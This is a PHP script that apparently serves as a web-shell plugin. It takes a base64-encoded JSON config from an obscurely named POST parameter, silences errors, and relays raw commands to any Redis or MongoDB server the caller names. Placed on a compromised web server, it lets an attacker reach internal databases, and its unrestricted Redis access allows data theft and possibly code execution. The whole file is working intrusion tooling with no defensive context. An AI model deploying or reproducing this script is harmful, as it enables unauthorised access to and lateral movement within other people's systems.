<?php

@error_reporting(0);
header('Content-Type: text/plain; charset=utf-8');

class RedisMgr {
    private $ip;
    private $port;
    private $pass;
    private $timeout;

    public function __construct($ip, $port, $pass, $timeout) {
        $this->ip = $ip;
        $this->port = $port;
        $this->pass = $pass;
        $this->timeout = $timeout;
    }

    // process action and query
    public function do_action($action, $query) {
        try {
            $errno = 0;
            $errstr = '';
            $socket = @fsockopen($this->ip, $this->port, $errno, $errstr, (float)$this->timeout);
            if (!$socket)
                return '[-] Redis connection failed.';

            stream_set_timeout($socket, $this->timeout);

            if (!empty($this->pass)) {
                $auth_cmd = "*2\r\n\$4\r\nAUTH\r\n$" . strlen($this->pass) . "\r\n" . $this->pass . "\r\n";
                fwrite($socket, $auth_cmd);

                $auth_resp = fgets($socket, 1024);
                if ($auth_resp == false || strpos($auth_resp, '-ERR') !== false) {
                    fclose($socket);
                    return '[-] Redis Auth Failed: ' . trim($auth_resp);
                }
            }

            if (strtolower($action) == 'connect') {
                fclose($socket);
                return '[+] SUCCESS_REDIS_CONNECTED -> Ready to send RESP commands.';
            }

            if (empty($query)) {
                $query = 'INFO';
            }

            $parts = preg_split('/\s+/', trim($query));
            $resp_builder = '*' . count($parts) . "\r\n";
            foreach ($parts as $part) {
                $resp_builder .= '$' . strlen($part) . "\r\n" . $part . "\r\n";
            }

            fwrite($socket, $resp_builder);
            
            $response = '';
            while (!feof($socket)) {
                $chunk = fread($socket, 8192);
                if ($chunk === false || $chunk === '')
                    break;
                
                $response .= $chunk;
                break;
            }

            fclose($socket);

            return $response;
            
        } catch (Exception $ex) {
            return '[-] Redis error: ' . $ex->getMessage();
        }
    }
}

class MongoDbMgr {
    private $ip;
    private $port;
    private $user;
    private $pass;
    private $timeout;

    public function __construct($ip, $port, $user, $pass, $timeout) {
        $this->ip = $ip;
        $this->port = $port;
        $this->user = $user;
        $this->pass = $pass;
        $this->timeout = $timeout;
    }

    // process action and query
    public function do_action($action, $query) {
        try {
            $errno = 0;
            $errstr = '';
            $socket = @fsockopen($this->ip, $this->port, $errno, $errstr, (float)$this->timeout);
            if (!$socket) {
                return '[-] MongoDB connection error: ' . $errstr;
            }

            stream_set_timeout($socket, $this->timeout);
            
            if (strtolower($action) === 'connect') {
                $ping_command = $this->build_mongo_command('admin', 'isMaster', 1);
                fwrite($socket, $ping_command);

                $buffer = fread($socket, 4096);
                fclose($socket);

                if (empty($buffer)) {
                    return '[-] MongoDB connection failed: Response is empty.';
                }

                return '[+] SUCCESS_MONGO_CONNECTED -> Successfully connected to MongoDB server.';
            }

            if (empty($query)) {
                $query = 'db.stats()';
            }

            $db_name = empty($this->user) ? 'admin' : $this->user;
            $cmd_bytes = $this->build_mongo_command($db_name, 'ping', 1);

            if (strpos($query, 'stats') !== false) {
                $cmd_bytes = $this->build_mongo_command($db_name, 'dbStats', 1);
            } else if (strpos($query, 'listCollections') !== false) {
                $cmd_bytes = $this->build_mongo_command($db_name, 'listCollections', 1);
            }

            fwrite($socket, $cmd_bytes);

            $resp_buffer = fread($socket, 8192);
            fclose($socket);

            return "[+] MongoDB command executed successfully:\n" . $this->extract_mongo_text($resp_buffer);
        } catch (Exception $ex) {
            return '[-] MongoDB connection/query error: ' . $ex->getMessage();
        }
    }

    private function build_mongo_command($db_name, $command_name, $command_value) {
        $bson = pack('V', 0);
        $bson .= chr(0x10);
        $bson .= $command_name . "\0";
        $bson .= pack('V', $command_value);
        $bson .= chr(0);

        $bson = pack("V", strlen($bson)) . substr($bson, 4);

        $msg = pack("V", 0);
        $msg .= pack("V", 12345);
        $msg .= pack("V", 0);
        $msg .= pack("V", 2013);
        $msg .= pack("V", 0);
        $msg .= $db_name . ".\$cmd\0";
        $msg .= pack("V", 0);
        $msg .= pack("V", 1);
        $msg .= $bson;

        $msg = pack("V", strlen($msg)) . substr($msg, 4);

        return $msg;
    }
    
    private function extract_mongo_text($buffer) {
        try {
            $sb = '';
            $length = strlen($buffer);
            for ($i = 0; $i < $length; $i++) {
                $c = $buffer[$i];
                $ascii = ord($c);
                if (($ascii >= 32 && $ascii <= 126)) {
                    $sb .= $c;
                } else if ($c === "\n" || $c === "\r" || $c === "\t") {
                    $sb .= $c;
                }
            }

            return empty($sb) ? '[Empty BSON binary response received]' : $sb;

        } catch (Exception $ex) {
            return '[-] MongoDB operation error: ' . $ex->getMessage();
        }
    }
}

function main() {
    // parameters
    $z1 = $_POST['z1'] ?? '';
    if (empty($z1))
        return '[-] Missing parameter z1.';

    $decoded = base64_decode($z1, true);
    $config = json_decode(($decoded !== false ? $decoded : $z1), true);
    if (!$config)
        return '[-] Invalid JSON / Base64.';

    $db_type = $config['dbtype'] ?? 'redis';
    $ip = $config['ip'] ?? '127.0.0.1';
    
    $port = isset($config['port']) && (int)$config['port'] > 0 ? (int)$config['port'] : (strtolower($db_type) === 'mongodb' ? 27017 : 6379);

    $user = $config['user'] ?? '';
    $pass = $config['pass'] ?? '';
    $action = $config['action'] ?? 'connect';
    $query = $config['query'] ?? '';

    $db_type = strtolower($db_type);
    $action = strtolower($action);

    $timeout = isset($config['timeout']) && (int)$config['timeout'] > 0 ? (int)$config['timeout'] : 10;

    // router
    if ($db_type == 'redis') {
        $redis = new RedisMgr($ip, $port, $pass, $timeout);
        return $redis->do_action($action, $query);
    } else if ($db_type == 'mongodb') {
        $mongodb = new MongoDbMgr($ip, $port, $user, $pass, $timeout);
        return $mongodb->do_action($action, $query);
    } else {
        return '[-] Unknown database type: ' . $db_type;
    }
}

echo(main());

?>